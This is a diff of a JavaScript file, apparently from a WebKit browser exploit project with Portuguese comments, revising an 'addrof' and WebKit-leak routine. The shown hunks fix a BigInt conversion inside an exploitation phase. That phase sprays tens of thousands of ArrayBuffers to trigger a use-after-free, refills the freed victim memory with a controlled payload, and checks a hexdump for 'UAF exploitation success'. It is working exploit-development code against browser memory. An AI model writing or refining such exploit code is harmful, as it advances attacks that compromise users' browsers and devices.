@@ -1,12 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v05 - Exploração Controlada de UAF)
+// js/script3/testArrayBufferVictimCrash.mjs (v06 - Correção de Conversão para BigInt)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. O objetivo agora é controlar a vulnerabilidade de Use-After-Free.
-// 2. A FASE 5 foi reescrita para:
-//    a. Alocar um conjunto de objetos "vítima".
-//    b. Liberar a memória desses objetos usando o "heap grooming" (gatilho do UAF).
-//    c. Imediatamente alocar um "payload" com dados controlados para preencher a memória liberada.
-//    d. Usar o hexdump para verificar se a substituição foi bem-sucedida.
+// 1. Corrigido o SyntaxError na FASE 5, que ocorria ao tentar converter
+//    o objeto AdvancedInt64 para BigInt de forma incorreta.
+// 2. A conversão agora é feita usando operações bit a bit, de forma robusta.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -160,20 +157,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("Iniciando 'do_grooming' para acionar o UAF e liberar a memória da vítima...", "warn");
         let freed_objects = [];
         for (let i = 0; i < 50000; i++) {
-             // A alternância de tamanhos ajuda a fragmentar o heap
             freed_objects.push(new ArrayBuffer(i % 2 === 0 ? VICTIM_SIZE : VICTIM_SIZE * 2));
         }
-        // Ao definir o array como nulo, o GC irá liberar os ArrayBuffers
         freed_objects = null; 
-        await PAUSE_S3(100); // Pausa curta para o GC atuar
+        await PAUSE_S3(100);
 
         // 3. Alocar o payload para sobrescrever a memória da vítima
         logS3("Alocando payload para sobrescrever a memória liberada...", "info");
         let payload = new ArrayBuffer(VICTIM_SIZE);
         let payload_view = new DataView(payload);
-        // Preenche o payload com nosso marcador
-        for(let i=0; i<VICTIM_SIZE; i+=8) {
-            payload_view.setBigUint64(i, BigInt(PAYLOAD_MARKER.toString()), true);
+        
+        // --- CORREÇÃO (v06) ---
+        // 1. Converter AdvancedInt64 para BigInt de forma correta.
+        const payload_as_bigint = (BigInt(PAYLOAD_MARKER.high()) << 32n) | BigInt(PAYLOAD_MARKER.low());
+        
+        // 2. Usar o valor BigInt para preencher o payload.
+        logS3(`Preenchendo payload com o valor BigInt: 0x${payload_as_bigint.toString(16)}`, 'debug');
+        for(let i = 0; i < VICTIM_SIZE; i += 8) {
+            payload_view.setBigUint64(i, payload_as_bigint, true);
         }
 
         // 4. Verificar se a corrupção ocorreu
@@ -182,8 +183,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         hexdump("Estado da Vítima APÓS o UAF e alocação do payload", block_after, victim_addr);
 
         // Análise final do resultado da Fase 5
-        const first_qword = new AdvancedInt64(block_after[0] | block_after[1] << 8 | block_after[2] << 16 | block_after[3] << 24, 
-                                            block_after[4] | block_after[5] << 8 | block_after[6] << 16 | block_after[7] << 24);
+        const first_qword_low = block_after[0] | (block_after[1] << 8) | (block_after[2] << 16) | (block_after[3] << 24);
+        const first_qword_high = block_after[4] | (block_after[5] << 8) | (block_after[6] << 16) | (block_after[7] << 24);
+        const first_qword = new AdvancedInt64(first_qword_low, first_qword_high);
 
         if(first_qword.equals(PAYLOAD_MARKER)) {
             logS3("++++++++++ SUCESSO DA EXPLORAÇÃO DO UAF! ++++++++++", "vuln");
